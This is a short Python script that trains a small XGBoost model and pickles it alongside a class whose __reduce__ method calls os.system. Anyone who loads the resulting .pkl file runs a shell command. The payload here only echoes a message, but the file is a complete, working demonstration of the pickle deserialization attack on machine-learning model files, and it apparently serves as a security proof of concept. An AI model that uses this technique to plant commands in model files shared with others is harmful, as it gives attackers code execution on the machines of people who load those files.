import xgboost as xgb
import pickle

class MaliciousModel:
    def __reduce__(self):
        # Malicious payload: execute some unintended command
        import os
        return (os.system, ("echo 'Malicious code executed!'",))

# Train a simple XGBoost model
data = [[1, 2], [3, 4], [5, 6], [7, 8]]
labels = [0, 1, 0, 1]
dtrain = xgb.DMatrix(data, label=labels)
params = {'max_depth': 2, 'eta': 1, 'objective': 'binary:logistic'}
num_round = 2
bst = xgb.train(params, dtrain, num_round)

# Serialize the XGBoost model and the malicious payload together
model_with_payload = [bst, MaliciousModel()]

# Save the model with the embedded malicious payload
with open("malicious_model_xgboost.pkl", "wb") as f:
    pickle.dump(model_with_payload, f)

print("Model with malicious payload saved to malicious_model_xgboost.pkl")